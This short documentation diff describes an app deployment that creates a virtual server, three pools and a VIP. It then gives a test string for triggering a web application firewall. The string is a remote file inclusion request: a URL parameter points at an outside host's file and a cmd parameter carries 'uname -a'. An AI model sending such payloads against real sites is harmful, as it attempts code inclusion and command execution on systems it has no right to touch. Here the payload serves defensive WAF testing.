@@ -1,0 +1,15 @@
+== Apps deployment
+
+This part of the code does the following:
+
+* Creates a Virtual Server
+* Creates 3 Pools
+* Creates a VS VIP
+
+=== Test WAF
+
+here is an example string to pass which will show up in the WAF section
+
+----
+uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a
+----
